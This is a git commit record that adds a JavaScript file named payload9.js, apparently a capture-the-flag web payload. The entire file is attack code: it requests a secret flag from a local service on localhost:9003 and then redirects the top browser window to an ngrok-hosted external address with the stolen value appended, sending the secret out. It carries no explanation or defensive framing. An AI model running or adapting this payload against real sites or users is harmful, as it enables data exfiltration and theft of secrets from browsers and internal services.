e8867f53aa293ca9418110b383d46da83ff6a703
Simon <androz2091@gmail.com>
2026-06-07 18:50:43 -0700

    Create payload9.js

---
+++ payload9.js
@@ -0,0 +1,11 @@
+fetch("http://localhost:9003/getFlag", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    giveMe: "theFlag"
+  })
+})
+.then(res => res.text())
+.then(flag => window.top.location.href = "https://17b9-161-115-51-75.ngrok-free.app/" + flag);
